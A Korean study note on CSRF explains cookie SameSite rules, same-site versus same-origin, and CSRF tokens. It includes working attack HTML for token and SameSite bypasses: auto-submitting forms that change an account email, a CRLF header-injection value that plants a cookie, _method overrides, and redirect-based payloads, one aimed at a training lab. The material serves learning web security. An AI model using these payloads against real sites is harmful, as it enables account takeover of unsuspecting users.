## CSRF

CSRF(Cross-Site Request Forgery, 사이트 간 요청 위조)는 공격자가 피해자의 브라우저를 이용해, 피해자가 이미 로그인한 사이트로 **위조된 요청을 보내게 만드는 공격**

**조건**
- 상태를 바꾸는 요청이어야함. 예: 송금, 비밀번호 변경, 이메일 변경, 관리자 기능 수행
- 쿠키 기반 세션 인증을 사용해야함. 
- 요청 파라미터를 공격자가 예측할 수 있어야함. 
	- 예: 비밀번호 변경 시 기존의 비밀번호를 요구하면 공격이 불가능함. 

**흐름**
1. 피해자는 `bank.com`에 로그인되어 있고 브라우저에 세션 쿠키가 있음. 
2. 피해자가 공격자 사이트 `evil.com`을 방문
3. `evil.com`이 몰래 `bank.com/transfer`로 POST 요청을 보냄
4. 브라우저는 `bank.com`에 대한 쿠키를 **자동으로 포함**해서 요청을 보냄
5. 서버는 정상적인 피해자의 요청으로 착각하고 처리함

**공격 스크립트**
- POST 
``` html
<!-- 해커의 서버 혹은 웹사이트의 댓글 -->
<html>
    <body>
        <form action="https://bank.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

- GET 
``` url
https://bank.com/email/change?email=pwned@evil-user.net
```

### 브라우저 쿠키 보안

기본적으로 쿠키는 도메인 정보와 함께 저장되는데 해당 도메인에 대한 요청 시 쿠키가 실림. 

`a.com`에서 `target.com`으로 요청을 보내는 경우
- 폼 제출의 경우: Origin 비교 없이 그냥 실음. (CSRF의 핵심)
- fetch의 경우: `a.com`(시작점)과 `target.com`(목적지)이 cross-origin이므로, 
	- `credentials: 'same-origin'`(기본값)에서는 쿠키를 실지 않음. 
	- `credentials: 'include'`에서는 실음.

최신 브라우저 규칙: `SameSite=Lax`가 기본값인 경우가 많음. (cross-site POST에서는 쿠키 미전송)

#### Site

- 목적: 브라우저가 다른 사이트로 가는 요청에 쿠키를 자동으로 실어 보낼 것인가
- `same-site`: eTLD(최상위 도메인)+1 (스키마는 동일해야함.)
- `cross-site`: `same-site`가 아닌 경로

![[Pasted image 20260919173735.png]]


| URL A                 | URL B                      | same-site?    |
| --------------------- | -------------------------- | ------------- |
| `https://example.com` | `https://api.example.com`  | ✅             |
| `https://example.com` | `http://example.com`       | ❌ (schema 다름) |
| `https://example.com` | `https://example.com:8080` | ✅ (port 무시)   |
| `https://example.com` | `https://evil.com`         | ❌             |

#### Origin

- 목적: 자바스크립트가 다른 출처의 리소스를 읽을 수 있는가
- `same-origin`: 스키마 + 호스트 + 포트, 3가지가 모두 같은 경로 
- `cross-origin`: `same-origin`이 아닌 경로

| URL A                   | URL B                      | same-origin?  |
| ----------------------- | -------------------------- | ------------- |
| `https://example.com/a` | `https://example.com/b`    | ✅ (경로는 무시)    |
| `https://example.com`   | `http://example.com`       | ❌ (scheme 다름) |
| `https://example.com`   | `https://example.com:8080` | ❌ (port 다름)   |
| `https://example.com`   | `https://api.example.com`  | ❌ (host 다름)   |

![[Pasted image 20260919173958.png]]


#### Site vs Origin

`Same-Origin`이면 무조건 `Same-Site`임. 하지만 `Same-Site`라고 해서 무조건 `Same-Origin`인 것은 아님. (서브도메인이 다르거나 포트가 다를 수 있으므로)

| 요청 1                      | 요청 2                           | 동일 사이트 (Same-Site)? | 동일 출처 (Same-Origin)? |
| :------------------------ | :----------------------------- | :------------------ | :------------------- |
| `https://example.com`     | `https://example.com`          | ✅                   | ✅                    |
| `https://app.example.com` | `https://intranet.example.com` | ✅                   | ❌ (도메인 이름 불일치)       |
| `https://example.com`     | `https://example.com:8080`     | ✅                   | ❌ (포트 불일치)           |
| `https://example.com`     | `https://example.co.uk`        | ❌ (eTLD 불일치)        | ❌ (도메인 이름 불일치)       |
| `https://example.com`     | `http://example.com`           | ❌ (스키마 불일치)         | ❌ (스키마 불일치)          |



### XSS vs CSRF 

XSS 취약점의 결과는 일반적으로 CSRF 취약점보다 더 심각함. 

1. CSRF 
	- 사용자가 수행할 수 있는 특정 작업에만 적용 (요청 보내기)
	- 공격 요청의 응답을 받지는 못함. (단방향 취약점)

2. XSS
	- 사용자가 수행할 수 있는 모든 작업을 유도할 수 있음. 
	- 공격 요청의 응답을 받을 수 있음. (양방향 취약점)

|능력|CSRF|XSS|
|---|---|---|
|요청 보내기|✅|✅|
|응답 읽기|❌|✅|
|DOM 읽기/조작|❌|✅|
|CSRF 토큰 읽기|❌|✅|
|데이터 외부로 유출|❌|✅|
|키로깅, 세션 탈취|❌|✅|
|사용자가 할 수 있는 모든 행동|❌|✅|


**CSRF 토큰의 반사형 XSS 방어**
반사형 XSS는 공격자가 만든 링크를 피해자가 클릭하는 cross-site 요청임. CSRF 토큰은 cross-site 요청 위조를 막을 수 있음. 

하지만 완전한 XSS 방어가 아님. 
- 저장형 XSS에는 효과 없음: 같은 사이트 내 요청이라 CSRF 토큰이 있어도 실행됨. 
- 다른 취약점에서 XSS로 CSRF 토큰 획득 후 사용


### CSRF 토큰

서버에서 고유한 CSRF 토큰을 생성하고 클라이언트에 공유함. 클라이언트에서 민감한 작업(예: 폼 제출)을 할 때 CSRF 토큰을 포함하고 서버는 토큰이 올바른지 확인함. 
공격자는 CSRF 토큰의 정확한 값을 예측할 수 없기 때문에 CSRF 공격이 불가하고 우회해야함. 

``` html 
<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>
```

``` http
POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com
```

참고: 일부 애플리케이션은 CSRF 토큰을 POST 요청 본문이 아니라 HTTP 헤더 등에 넣어서 전송하는 방식을 사용함. 

#### 우회

##### 토큰이 누락된 경우

일부 애프리케이션은 토큰이 존재할 때 올바르게 작동하지만 토큰이 누락(단순 값뿐만 아니라 전체 파라미터)된 경우 검증을 안하고 넘어갈 수도 있음. 


##### 요청 메서드에 따라 다른 경우

일부 애플리케이션에서는 POST 메서드에서는 토큰을 검증하지만 GET 메서드를 사용하면 검증을 생략하는 경우가 있음. 
- GET/POST 둘 다 열어놓고 실수로 POST에서만 검증하도록 작성하는 경우
- POST만 열어놓으려고 했는데 GET도 동작하는 경우

- POST 요청: CSRF 토큰 검사를 함. 
``` http 
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

email=pwned@evil-user.net&csrf=...
```

- GET 요청: CSRF 토큰 검사를 생략함. 
``` http
GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
```


##### 토큰이 사용자 세션과 연결되지 않은 경우

일부 애플리케이션은 요청을 하는 사용자 세션에 속하는 토큰인지 확인하지 않고 유효한 토큰을 통째로 관리함. 
공격자는 자신의 CSRF 토큰을 피해자의 요청에 넣어서 공격할 수 있음. 


##### 세션 쿠키와 연결되어 있는 경우

세션 관리와 CSRF 보호에서 서로 다른 프레임워크를 사용하는 경우 CSRF 토큰이 세션에 연결되지 않고 다른 CSRF 관련 쿠키와 연결되어 있음. 
``` http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

만약 웹사이트에 **공격자가 피해자의 브라우저의 쿠키를 설정할 수 있는 취약점**이 있다면 공격자는 피해자의 브라우저의 쿠키를 자신의 유효한 CSRF 쿠키로 바꾸고 CSRF 공격을 할 수 있음. 

예: 검색 기능의 응답에서 `Set-Cookie: LastSearchTerm={검색 결과}`처럼 쿠키를 설정하는 경우, 해당 URL로 `Set-Cookie: csrfKey={유효한쿠키}; SameSite=None; Secure`를 추가할 수 있음. 
``` http
%0d%0aSet-Cookie:%20csrfKey={유효한쿠키};%20SameSite=None;%20Secure
```
- `%0d%0a`: 헤더의 줄바꿈 

결과 
``` http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=123
Set-Cookie: csrfKey={유효한쿠키}; SameSite=None; Secure; Secure; HttpOnly
...
```

공격 스크립트 
``` html
<html>
  <body>
    <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test3&#64;test&#46;ca" />
      <input type="hidden" name="csrf" value="SXsROOTp3jzq6M5UzIL2KkJIqGpfFIqb" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey={유효한쿠키}%3b%20SameSite%3dNone%3b%20Secure" onerror="document.forms[0].submit()" />
  </body>
</html>
```


##### 쿠키와 요청 매개변수의 토큰이 일치하는지 확인하는 경우

일부 애플리케이션은 쿠키와 요청 매개변수에 각각 동일한 CSRF 토큰을 담기도록 하고 두 토큰이 동일한지만 확인해서 검증함. 
서버에서는 토큰에 대한 데이터를 저장하지 않고 오직 쿠키와 요청 매개변수의 값만 비교함. 

``` http 
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
```

만약 웹사이트에 **공격자가 피해자의 브라우저의 쿠키를 설정할 수 있는 취약점**이 있다면 공격자는 피해자의 브라우저의 쿠키를 임의로 바꾸고 요청 매개변수에 동일한 값을 넣어서 공격할 수 있음. 


### SameSite

SameSite는 브라우저 보안 기능으로 다른 웹사이트에서 발생하는 요청에 웹사이트의 쿠키를 포함할지 말지를 결정함. CSRS, XSS, 일부 CORS 공격 등을 보호할 수 있음. 

HTTP 응답에 `SameSite` 속성을 추가하면 설정할 수 있음. 
``` http
Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict
```

| 값        | 같은 사이트 요청 | cross-site top-level GET | cross-site POST / iframe / AJAX |
| -------- | --------- | ------------------------ | ------------------------------- |
| `Strict` | 전송        | 미전송                      | 미전송                             |
| `Lax`    | 전송        | 전송                       | 미전송                             |
| `None`   | 전송        | 전송                       | 전송 (`Secure` 필수)                |
- top-level: 주소 표시줄의 URL이 바뀌는 네비게이션 
	- 예: 링크 클릭, 주소 입력, 폼 제출, 리다이렉트 
- subresouce: 주소 표시줄의 URL이 바뀌지 않고 페이지 안에 존재
	- 예: `<img>`, `<iframe>`, `fetch()`, `<script>`, `<link>`

**Strict**
`SameSite=Strict`는 가장 보안이 강한 설정임. 외부 사이트에서 `bank.com` 링크를 클릭해도 쿠키를 포함시키지 않음. 
사용자 입장에서는 다른 사이트에서 `bank.com` 링크를 타고 들어갔을때 UX가 불편할 수 있음. (로그인이 안 되어있음.)

**Lax**
`SameSite=Lax`는 **현대 브라우저의 기본값**임.
- 같은 사이트 요청: 쿠키 전송
- 외부 클릭 GET 요청: 쿠키 전송
- 외부 사이트에서 보내는 POST, iframe, AJAX, img 요청: 쿠키 미전송

**None**
`SameSite=None`은 SameSite 설정을 비활성화 하는 것임. 해당 웹사이트에 대한 모든 요청(cross-site 포함)에 쿠키가 적용됨. 
``` http
Set-Cookie: trackingId=...; SameSite=None; Secure
```
- `Secure` 속성을 필수적으로 포함해야함. 
- 쿠키가 제3자 환경에서 설정 되어야하는 경우에 사용함. 예: 추적 쿠키


#### 우회

먼저 세션 등의 쿠키가 처음 발급될 때 `SameSite`가 무엇으로 설정됐는지 확인해야함. 아무 설정도 없다면 `SameSite=Lax`임.

##### GET 요청으로 우회

만약 `SameSite=Lax`이고 GET도 열어둔 경우, GET으로 바꿔서 요청이 가능함. 
``` html
<script>
    document.location = 'https://example.com/email/change?email=pwned@evil-user.net';
</script>
```


##### `_method` 사용

일부 프레임워크(Ruby on Rails, PHP Laravel, PHP Symfony, Node.js Express)에서는 폼에서 `_method`를 지원하는데 이 필드에 넣은 HTTP 메서드로 서버에서 처리를 함. 

``` http 
<form action="https://example.com/account/transfer-payment" method="GET">
    <input type='hidden' name='_method' value='POST'>
    <input type='hidden' name='email' value='test1234@gmail.com'>
</from>
<script>document.forms[0].submit()</script>
```
- `form`의 `method`는 GET이라서 `SameSite=Lax`에서는 쿠키를 적용시킴. 
- `_method` 필드 때문에 서버에서는 POST로 처리됨. 


##### 클라이언트 측 리다이렉션

`SameSite=Strict`가 설정되어 있는 경우에는 다른 사이트에서의 요청에는 쿠키를 포함하지 않으므로 클라이언트 측 리다이렉션 방법을 사용해야함. 

1. 타켓 사이트에 클라이언트 측 리다이렉션 취약점이 있어야함. (즉, 공격자가 원하는 URL로 리다이렉트 시킬 수 있어야함.)
	- 예: DOM 기반 오픈 리다이렉션
2. 리다이렉션 URL GET 요청으로 상태 변경을 할 수 있어야함. 
	- 예: 이메일 변경, 송금 등

예시 코드 
``` js
// victim.com의 페이지 코드 (취약한 부분)
const urlParams = new URLSearchParams(window.location.search);
const redirectUrl = urlParams.get('redirect');
if (redirectUrl) {
    window.location = redirectUrl; // 클라이언트 측 리다이렉션
}
```

공격 스크립트
``` html
<script>
    document.location = 'https://target.com/?redirect=/my-account/change-email?email=attacker@evil.com';
</script>
```


참고
클라이언트 측 리다이렉션은 실제로는 리다이렉션이 아니라 동일한 도메인에서 발생하는 일반적인 요청으로 처리됨. 
서버 측 리다이렉션(302 응답)도 공격이 가능하지만 리다이렉션으로 취급되기 때문에 쿠키 갱신 시점이 스펙/브라우저마다 다를 수 있음. 


##### 취약한 상위 도메인 활용

SameSite는 eTLD+1를 기준으로 판단함. 즉 `victim.com`과 `attacker.victim.com`은 same-site임. 
`victim.com`은 철저히 방어가 되고 있어도 eTLD+1에 속한 다른 서브도메인이 취약하다면 공격이 가능함. 
- 예: `attacker.victim.com`에서 XSS로 JS를 실행해서 `victim.com`으로 요청을 보내서 CSRF 공격


